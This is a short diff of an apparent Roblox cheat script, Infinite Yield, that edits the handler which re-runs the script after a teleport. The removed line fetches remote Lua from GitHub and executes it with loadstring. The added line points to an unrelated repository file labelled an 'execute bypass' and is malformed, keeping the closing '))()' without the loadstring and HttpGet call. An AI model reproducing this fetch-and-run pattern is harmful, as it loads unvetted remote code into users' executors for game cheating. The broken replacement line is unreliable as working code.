@@ -6351,7 +6351,7 @@ local TeleportCheck = false
 Players.LocalPlayer.OnTeleport:Connect(function(State)
 	if KeepInfYield and (not TeleportCheck) and queueteleport then
 		TeleportCheck = true
-		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()")
+		queueteleport("https://raw.githubusercontent.com/Gumicuci/72113192018119/refs/heads/main/infinite%20yield%20%5Bexecute%20bypass%5D.lua'))()")
 	end
 end)
 
